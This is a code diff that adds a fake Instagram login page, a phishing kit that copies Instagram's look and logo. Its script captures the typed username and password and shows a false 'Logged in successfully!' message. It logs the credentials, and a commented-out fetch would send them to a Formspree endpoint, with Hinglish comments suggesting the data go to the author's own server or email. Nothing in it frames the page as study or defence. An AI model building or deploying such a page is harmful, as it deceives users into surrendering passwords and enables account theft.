@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <!-- Instagram Logo Link -->
+        <img src="https://www.instagram.com/static/images/logos/instagram-logo.png/210f99111d0e.png" alt="Instagram Logo">
+        
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Data ko GitHub Pages par bhejne ke liye ya console mein dikhane ke liye
+            const username = e.target.username.value;
+            const password = e.target.password.value;
+            
+            alert('Logged in successfully!'); // Fake success message
+            
+            // Yahan tu ye data apne server ya email par bhej sakta hai
+            console.log("Username: " + username + " | Password: " + password);
+            
+            // Example: Agar tu "Formspree" use karna chahta hai bina backend ke:
+            // fetch('https://formspree.io/f/YOUR_FORM_ID', {
+            //     method: 'POST',
+            //     body: JSON.stringify({username: username, password: password}),
+            //     headers: { 'Content-Type': 'application/json' }
+            // });
+        });
+    </script>
+</body>
